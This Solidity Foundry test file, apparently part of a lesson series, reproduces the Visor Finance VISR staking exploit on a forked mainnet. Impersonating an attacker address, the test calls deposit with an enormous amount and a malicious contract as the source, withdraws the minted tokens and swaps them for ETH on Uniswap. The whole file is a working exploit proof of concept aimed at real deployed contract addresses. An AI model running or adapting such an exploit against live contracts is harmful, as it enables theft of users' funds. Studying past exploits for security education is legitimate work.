// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Lesson 2 - visr.sol";
import "openzeppelin-contracts/token/ERC20/IERC20.sol";

contract VisrExploitTest is Test {
    VisrInterface public visrContract;
    VisrExploiter public visrExploitContract;
    UniswapV2Interface public uniswapContract;
    address public weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    IERC20 public visrToken;
    IERC20 public vvisrToken;
    uint256 MAX_INT_MINTABLE = 0xfffffffffffffffffffffffffffffff;

    // setup function runs before tests begin
    function setUp() public {
        // Change to the point in time of the exploit
        vm.rollFork(13848982);

        // The address of the deployed visrStaking contract
        visrContract = VisrInterface(0xC9f27A50f82571C1C8423A42970613b8dBDA14ef);
        uniswapContract = UniswapV2Interface(payable(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D));

        // set variables
        visrToken = IERC20(visrContract.visr());
        vvisrToken = IERC20(visrContract.vvisr());

        // the malicious contract we want to deploy
        visrExploitContract = new VisrExploiter();

        // we (attacker) will take on address 0x7
        vm.startPrank(address(0x7));
    }

    // anything prefixed with test will start with the --match ^testVisr flag
    function testVisr() public {
        // Deposit setting the from contract to the malicious hacker contract
        console.log("ETH BALANCE BEFORE HACK: ", address(0x7).balance);
        visrContract.deposit(MAX_INT_MINTABLE, address(visrExploitContract), address(0x7));
        console.log("VVSIR BALANCE AFTER DEPOSIT: ", vvisrToken.balanceOf(address(0x7)));
        visrContract.withdraw(vvisrToken.balanceOf(address(0x7)), address(0x7), address(0x7));

        // Setup path swaps for Uniswap & approve Uniswap to trade our token for ETH
        address[] memory path = new address[](2);
        path[0] = address(visrToken);
        path[1] = weth;
        visrToken.approve(address(uniswapContract), visrToken.balanceOf(address(0x7)));

        // Execute Swap
        uint256[] memory amounts =
            uniswapContract.swapExactTokensForETH(visrToken.balanceOf(address(0x7)), 0, path, address(0x7), 2650097619);
        uint256 visrTokensTraded = amounts[0] / 1e18;
        uint256 ethTokensReceived = amounts[1] / 1e18;
        console.log("Visr amount traded:", visrTokensTraded, "for value of ETH:", ethTokensReceived);
    }
}
